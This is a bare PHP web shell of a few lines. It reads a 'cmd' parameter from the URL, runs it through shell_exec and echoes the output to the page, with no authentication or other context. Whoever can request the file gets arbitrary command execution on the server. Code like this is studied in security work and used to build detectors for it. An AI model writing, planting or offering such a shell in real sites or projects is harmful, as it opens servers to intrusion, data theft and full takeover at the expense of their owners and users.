<?php
if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
  echo '<pre>';
  echo shell_exec($_GET['cmd']);
  echo '</pre>';
}
